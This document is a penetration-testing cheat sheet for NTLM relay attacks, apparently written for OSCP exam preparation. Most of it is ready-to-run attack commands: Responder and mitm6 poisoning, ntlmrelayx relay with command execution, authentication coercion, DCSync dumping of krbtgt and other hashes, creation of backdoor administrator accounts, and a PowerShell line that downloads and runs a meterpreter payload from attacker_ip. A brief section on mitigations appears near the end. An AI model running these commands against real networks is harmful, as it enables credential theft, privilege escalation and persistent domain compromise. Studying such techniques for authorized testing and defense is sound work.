    NTLM Relay Attack

    Overview

    NTLM Relay attacks exploit the NTLM authentication protocol by intercepting and relaying authentication requests to target systems. This allows attackers to authenticate as legitimate users without knowing their passwords.

    Prerequisites

    Required Tools

    • Responder - LLMNR/NBT-NS/MDNS poisoner
    • ntlmrelayx (Impacket) - NTLM relay tool
    • Proxychains (optional) - For pivoting
    • CrackMapExec - Post-exploitation and verification
    • mitm6 - IPv6 DHCP spoofing for relay

    Installation

    # Install Impacket
sudo apt install impacket-scripts
# OR from source
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .

# Install Responder
sudo apt install responder
# OR from source
git clone https://github.com/lgandx/Responder.git

# Install mitm6
sudo apt install mitm6
# OR
pip install mitm6

# Install CrackMapExec
sudo apt install crackmapexec

    Understanding NTLM Relay

    What is NTLM Relay?

    NTLM Relay works by:

    1. Intercepting authentication attempts (via LLMNR/NBT-NS poisoning or mitm6)
    2. Relaying those credentials to target systems
    3. Authenticating to services on behalf of the victim
    4. Executing commands or dumping credentials

    Requirements for Success

    ✅ SMB Signing must be disabled or not required on target ✅ Valid network credentials being relayed ✅ Relayed user must have admin rights on target (for most attacks) ✅ Network connectivity between attacker and targets

    Common Attack Scenarios

    1. SMB to SMB - Relay SMB auth to another SMB service
    2. HTTP to SMB - Relay HTTP auth to SMB
    3. LDAP to LDAP - Relay to domain controller LDAP
    4. SMB to LDAPS - Relay to secure LDAP for DCSync

    Reconnaissance

    Step 1: Identify Targets Without SMB Signing

    Using CrackMapExec: 

    crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

    Using Nmap: 

    nmap --script smb-security-mode.nse -p445 192.168.1.0/24
nmap --script smb2-security-mode.nse -p445 192.168.1.0/24

    Manual Check with Nmap: 

    nmap -p445 --script smb-security-mode 192.168.1.100

    Look for: 

    | smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   message_signing: disabled (dangerous, but default)

    Step 2: Identify Domain Controllers

    # Using CrackMapExec
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# Using Nmap
nmap -p389,636,3268,3269 192.168.1.0/24

# Using nslookup
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN.LOCAL

    Step 3: Network Discovery

    # Identify live hosts
nmap -sn 192.168.1.0/24

# Identify Windows hosts
crackmapexec smb 192.168.1.0/24

# Enumerate shares
crackmapexec smb 192.168.1.0/24 -u '' -p '' --shares

    Attack Execution

    Method 1: SMB Relay with Responder + ntlmrelayx

    Step 1: Configure Responder

    Edit /etc/responder/Responder.conf or /usr/share/responder/Responder.conf:

    [Responder Core]

; Servers to start
SQL = On
SMB = Off      # Turn OFF to allow ntlmrelayx to handle SMB
HTTP = Off     # Turn OFF if relaying HTTP
HTTPS = On
LDAP = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
DNS = On
MDNS = On

    Step 2: Start Responder

    # Start Responder in analyze mode first (recommended)
sudo responder -I eth0 -A

# Start Responder for poisoning
sudo responder -I eth0 -dwv

# Options:
# -I eth0    : Interface
# -d         : Enable DHCP poisoning
# -w         : Enable WPAD rogue proxy
# -v         : Verbose

    Step 3: Start ntlmrelayx

    Basic Relay (Command Execution): 

    # Relay and execute commands
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Relay and dump SAM hashes
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Relay with specific command
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc <base64_payload>"

    Interactive Shell: 

    # Get interactive shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
# Then connect: nc 127.0.0.1 11000

    SOCKS Proxy: 

    # Setup SOCKS proxy
sudo ntlmrelayx.py -tf targets.txt -smb2support -socks

# Use with proxychains
proxychains smbclient //192.168.1.100/C$
proxychains secretsdump.py DOMAIN/USER@192.168.1.100

    Advanced Options: 

    # Relay to specific target
sudo ntlmrelayx.py -t 192.168.1.100 -smb2support

# Relay and execute specific commands
sudo ntlmrelayx.py -tf targets.txt -smb2support \
  -c "net user hacker Passw0rd! /add && net localgroup Administrators hacker /add"

# Relay and dump credentials
sudo ntlmrelayx.py -tf targets.txt -smb2support --dump-laps --dump-gmsa --dump-adcs

# Relay with verbose output
sudo ntlmrelayx.py -tf targets.txt -smb2support -debug

    Step 4: Trigger Authentication

    Wait for Natural Events: - User browsing to file shares - Scheduled tasks accessing network resources - Applications making network calls

    Force Authentication: 

    # Using PetitPotam (CVE-2021-36942)
python3 PetitPotam.py -u user -p password attacker_ip target_ip

# Using PrinterBug
python3 printerbug.py domain/user:password@target attacker_ip

# Using Coercer
coercer coerce -u user -p password -d domain -t target -l attacker_ip

    Method 2: LDAP/LDAPS Relay (DCSync Attack)

    Relay to LDAP for ACL Modifications

    # Relay to LDAP and add user to group
sudo ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user hacker

# Relay to LDAPS (more reliable)
sudo ntlmrelayx.py -t ldaps://dc01.domain.local --escalate-user hacker

# Relay and perform DCSync
sudo ntlmrelayx.py -t ldaps://dc01.domain.local --escalate-user hacker --dump

    After Escalation - Perform DCSync

    # Using secretsdump
secretsdump.py 'DOMAIN/hacker:password@dc01.domain.local' -just-dc-user krbtgt

# Dump all hashes
secretsdump.py 'DOMAIN/hacker:password@dc01.domain.local' -just-dc

# Using mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv

    Method 3: mitm6 + ntlmrelayx (IPv6 Attack)

    Step 1: Start mitm6

    # Basic mitm6 attack
sudo mitm6 -d domain.local

# Target specific domain
sudo mitm6 -d domain.local --interface eth0

# With DNS blacklist
sudo mitm6 -d domain.local -i eth0 --ignore-nofqnd

    Step 2: Start ntlmrelayx with WPAD

    # Relay via WPAD
sudo ntlmrelayx.py -6 -t ldaps://dc01.domain.local -wh attacker-wpad

# Relay and escalate
sudo ntlmrelayx.py -6 -t ldaps://dc01.domain.local -wh attacker-wpad \
  --escalate-user hacker --delegate-access

# Relay with SOCKS
sudo ntlmrelayx.py -6 -t ldaps://dc01.domain.local -wh attacker-wpad -socks

    Method 4: Relay to Specific Services

    HTTP/WebDAV Relay

    # Relay HTTP to SMB
sudo ntlmrelayx.py -t smb://192.168.1.100 -smb2support

# Host malicious file
echo '<img src="file://attacker_ip/share">' > index.html
python3 -m http.server 80

    MSSQL Relay

    # Relay to MSSQL
sudo ntlmrelayx.py -t mssql://192.168.1.100 -q "SELECT SYSTEM_USER"

# Enable xp_cmdshell and execute
sudo ntlmrelayx.py -t mssql://192.168.1.100 \
  -q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'"

    Post-Exploitation

    Dump Credentials

    Local SAM Database: 

    secretsdump.py 'DOMAIN/user:password@192.168.1.100'

    Active Directory (DCSync): 

    # Dump specific user
secretsdump.py 'DOMAIN/user:password@dc01.domain.local' -just-dc-user Administrator

# Dump krbtgt (for Golden Ticket)
secretsdump.py 'DOMAIN/user:password@dc01.domain.local' -just-dc-user krbtgt

# Dump everything
secretsdump.py 'DOMAIN/user:password@dc01.domain.local' -just-dc

    Create Backdoor Accounts

    # Via ntlmrelayx
sudo ntlmrelayx.py -tf targets.txt -smb2support \
  -c "net user backdoor Passw0rd123! /add && net localgroup Administrators backdoor /add"

# Via CrackMapExec (after getting creds)
crackmapexec smb 192.168.1.100 -u user -p password -x \
  "net user backdoor Passw0rd123! /add && net localgroup Administrators backdoor /add"

    Establish Persistence

    Deploy Reverse Shell: 

    # Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=attacker_ip LPORT=4444 -f exe > shell.exe

# Relay and execute
sudo ntlmrelayx.py -tf targets.txt -smb2support \
  -c "powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://attacker_ip/shell.exe','C:\\Windows\\Temp\\shell.exe'); C:\\Windows\\Temp\\shell.exe"

    WMI Persistence: 

    # Via impacket
wmiexec.py 'DOMAIN/user:password@192.168.1.100'

    Pivot Through Network

    Using SOCKS Proxy: 

    # Start ntlmrelayx with SOCKS
sudo ntlmrelayx.py -tf targets.txt -smb2support -socks

# Configure proxychains (/etc/proxychains4.conf)
# Add: socks4 127.0.0.1 1080

# Use proxychains
proxychains crackmapexec smb 192.168.2.0/24
proxychains secretsdump.py DOMAIN/user@192.168.2.100

    OSCP Exam Strategy

    Phase 1: Reconnaissance (5-10 minutes)

    1. Scan for SMB signing status: 

      crackmapexec smb 192.168.x.0/24 --gen-relay-list targets.txt

    2. Identify domain controllers: 

      nmap -p389,636,88 192.168.x.0/24

    3. Check network connectivity: 

      ping -c 1 <targets>

    Phase 2: Setup (2-5 minutes)

    1. Configure Responder: 

      sudo nano /etc/responder/Responder.conf
# Set SMB = Off, HTTP = Off

    2. Start Responder: 

      sudo responder -I tun0 -dwv

    3. Start ntlmrelayx in another terminal: 

      sudo ntlmrelayx.py -tf targets.txt -smb2support -i

    Phase 3: Wait and Exploit (Variable)

    1. Monitor for incoming connections
    2. If you get a relay, note the connection details
    3. Connect to interactive shell if enabled: 
      nc 127.0.0.1 11000

    Phase 4: Post-Exploitation (10-20 minutes)

    1. Dump credentials: 

      secretsdump.py 'DOMAIN/user:password@target'

    2. Check privilege level: 

      crackmapexec smb target -u user -p password

    3. Execute commands or get shell: 

      wmiexec.py 'DOMAIN/user:password@target'
psexec.py 'DOMAIN/user:password@target'

    Phase 5: Lateral Movement

    1. Use obtained credentials: 

      crackmapexec smb 192.168.x.0/24 -u user -H ntlmhash

    2. Continue pivoting until domain admin or full network compromise

    Troubleshooting

    Common Issues

    1. "SMB Signing is required" 

    Solution: Target doesn't support relay, try different targets

    2. "Access Denied" 

    Solution: Relayed user doesn't have admin rights on target
Try different targets or wait for different user

    3. "Connection Timeout" 

    Solution: Check network connectivity and firewall rules
Verify targets are online: nmap -Pn -p445 <target>

    4. "Responder not capturing hashes" 

    Solution:
- Verify SMB/HTTP are OFF in Responder.conf
- Check interface: ip addr show
- Ensure you're on the correct network segment

    5. "ntlmrelayx not relaying" 

    Solution:
- Verify SMB2 support: --smb2support
- Check targets list is valid
- Ensure Responder is running first

    Defense and Mitigation

    Enable SMB Signing

    Via Group Policy: 

    Computer Configuration -> Policies -> Windows Settings -> 
Security Settings -> Local Policies -> Security Options

Set:
- "Microsoft network client: Digitally sign communications (always)" = Enabled
- "Microsoft network server: Digitally sign communications (always)" = Enabled

    Via Registry: 

    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters" `
  -Name "RequireSecuritySignature" -Value 1

    Disable LLMNR and NBT-NS

    Disable LLMNR via Group Policy: 

    Computer Configuration -> Administrative Templates -> 
Network -> DNS Client -> Turn off multicast name resolution = Enabled

    Disable NBT-NS: 

    $adapters = Get-WmiObject Win32_NetworkAdapterConfiguration
$adapters | ForEach-Object { $_.SetTcpipNetbios(2) }

    Enable LDAP Signing and Channel Binding

    LDAP Signing: 

    Computer Configuration -> Policies -> Windows Settings -> 
Security Settings -> Local Policies -> Security Options

"Domain controller: LDAP server signing requirements" = Require signing

    Advanced Techniques

    NTLM Relay with Delegation

    # Relay and configure resource-based constrained delegation
sudo ntlmrelayx.py -t ldaps://dc01.domain.local \
  --delegate-access --escalate-user hacker

# Use the delegated access
getST.py -spn cifs/target.domain.local \
  -impersonate Administrator domain.local/hacker$

    Relay with Shadow Credentials

    # Relay and add shadow credentials
sudo ntlmrelayx.py -t ldaps://dc01.domain.local \
  --shadow-credentials --shadow-target target$

# Use the certificate to authenticate
python3 gettgtpkinit.py -pfx-base64 <base64_cert> \
  domain.local/target$ target.ccache

    Multi-Relay Attack

    # Setup multiple ntlmrelayx instances
sudo ntlmrelayx.py -tf smb_targets.txt -smb2support -i &
sudo ntlmrelayx.py -t ldaps://dc01.domain.local --escalate-user hacker &

# Start Responder
sudo responder -I eth0 -dwv

    Quick Reference Commands

    Essential Commands

    # 1. Scan for vulnerable targets
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# 2. Configure Responder (SMB=Off, HTTP=Off)
sudo nano /etc/responder/Responder.conf

# 3. Start Responder
sudo responder -I eth0 -dwv

# 4. Start ntlmrelayx (basic)
sudo ntlmrelayx.py -tf targets.txt -smb2support

# 5. Start ntlmrelayx (interactive shell)
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# 6. Start ntlmrelayx (SOCKS proxy)
sudo ntlmrelayx.py -tf targets.txt -smb2support -socks

# 7. Connect to interactive session
nc 127.0.0.1 11000

# 8. Dump credentials after relay
secretsdump.py 'DOMAIN/user:password@target'

# 9. Verify access
crackmapexec smb target -u user -p password

# 10. Get shell
psexec.py 'DOMAIN/user:password@target'

    Cheat Sheet Summary

    Pre-Attack Checklist

    • [ ] Identify targets without SMB signing
    • [ ] Locate domain controllers
    • [ ] Configure Responder (disable SMB/HTTP)
    • [ ] Prepare targets.txt file
    • [ ] Ensure network connectivity

    Attack Flow

    1. Start Responder → 2. Start ntlmrelayx → 3. Wait for auth → 4. Relay → 5. Exploit

    Key ntlmrelayx Options

    Option Description
    -tf targets.txt Target file
    -t <target> Single target
    -smb2support Enable SMB2/3 support
    -i Interactive shell
    -socks SOCKS proxy
    -c "command" Execute command
    --escalate-user LDAP privilege escalation
    -6 IPv6 support (with mitm6)
    -wh <host> WPAD host

    Post-Exploitation Tools

    secretsdump.py    # Dump credentials
psexec.py         # Get SYSTEM shell
wmiexec.py        # WMI execution
smbexec.py        # SMB execution
atexec.py         # AT scheduler execution

    OSCP Exam Notes

    Important

    • NTLM Relay attacks are time-dependent - be patient
    • Always check SMB signing status first
    • Have alternative attack vectors ready
    • Document all relayed sessions and credentials
    • Practice in labs before exam

    Pro Tips

    • Use -i flag for interactive shells - more control
    • SOCKS proxy is powerful for pivoting
    • mitm6 can be more effective than Responder in some networks
    • Always try LDAPS relay to DC if possible - can grant DCSync rights
    • Keep ntlmrelayx running throughout entire exam period

    Exam Restrictions

    • Ensure your attacks are only targeting exam machines
    • Do not perform DoS attacks
    • Follow exam guidelines regarding automated tools
    • Document methodology for report
